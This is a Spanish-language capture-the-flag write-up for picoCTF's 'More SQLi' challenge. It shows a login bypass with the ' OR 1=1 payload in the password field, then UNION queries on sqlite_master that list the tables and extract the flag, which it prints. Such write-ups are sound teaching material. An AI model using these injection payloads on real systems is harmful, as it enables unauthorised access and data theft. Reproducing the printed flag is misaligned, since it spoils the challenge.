## Reto:  More SQLi
### Descripción
Puede encontrar la bandera en este sitio web.Intenta encontrar la bandera [aquí](http://saturn.picoctf.net:56161/).
### Solución
Entramos a la pagina que nos proporciona el enlace
Ahora vemos que existe un `loggin`  el cual no tenemos acceso por lo que por medio de `payload` ingresamos.
En `username` ponemos `' OR 1=1;
Y en contrasena ingresamos lo que sea, vemos que nos regresa lo siguiente:
```HTTP
username: ' OR 1=1;
password: fsf
SQL query: SELECT id FROM users WHERE password = 'fsf' AND username = '' OR 1=1;'
```

Podemos notar que el `payload` se tiene que hacer en el apartado `password`, por lo que hacemos lo mismo, pero con la contrasena.
Y logramos ingresar!

Vemos que nos aparece una tabla con países.
Ingresamos el siguiente comando:
```SQL
'union select sql,2,3 from sqlite_master;
```
Esto nos permite unir la consulta y mostrar la estructura SQL del diagrama de la pagina.

Esto nos muestra las tablas que hay:
```sql
|City|Address|Phone|
|---|---|---|
||2|3|
|CREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT)|2|3|
|CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)|2|3|
|CREATE TABLE offices (id INTEGER NOT NULL PRIMARY KEY, city TEXT, address TEXT, phone TEXT)|2|3|
|CREATE TABLE users (name TEXT NOT NULL PRIMARY KEY, password TEXT, id INTEGER)|2|3|
```

Podemos ver que en la tabla `more_table` esta la bandera, asi que escribimos lo siguiente:
```sql
'union select id,flag,3 from more_table;
```
Esto nos devolverá el id y la bandera:
```sql
|City|Address|Phone|
|---|---|---|
|1|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}|3|
|2|If you are here, you must have seen it|3|
```

Y encontramos la bandera:
```flag
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}
```

### Notas adicionales
### Referencias

[[More SQLi]]